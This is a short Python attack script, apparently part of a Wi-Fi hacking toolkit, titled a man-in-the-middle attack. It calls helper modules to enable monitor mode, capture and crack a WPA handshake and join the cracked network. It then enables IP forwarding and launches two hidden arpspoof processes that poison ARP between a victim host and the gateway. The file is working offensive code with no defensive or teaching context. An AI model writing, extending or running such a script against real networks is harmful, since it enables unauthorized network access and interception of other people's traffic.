import os
import subprocess
from HostDiscovery import device_discovery
from ConnectCrackedNetwork import connect_to_cracked_network
from MonitorMode import switch_monitor_mode
from WPA_Handshake import wpa_capture_password_cracking
from RestartNetwork import restart_network_services


def man_in_middle_attack():
    switch_monitor_mode()
    wpa_capture_password_cracking()
    restart_network_services()
    connect_to_cracked_network()
    device_discovery()


    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    command1 = ["arpspoof", "-i", "wlan0mon", "-t", "192.168.10.3", "192.168.10.1"]
    command2 = ["arpspoof", "-i", "wlan0mon", "-t", "192.168.10.1", "192.168.10.3"]

    subprocess.Popen(command1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    os.system('ps aux | grep "arpspoof"')

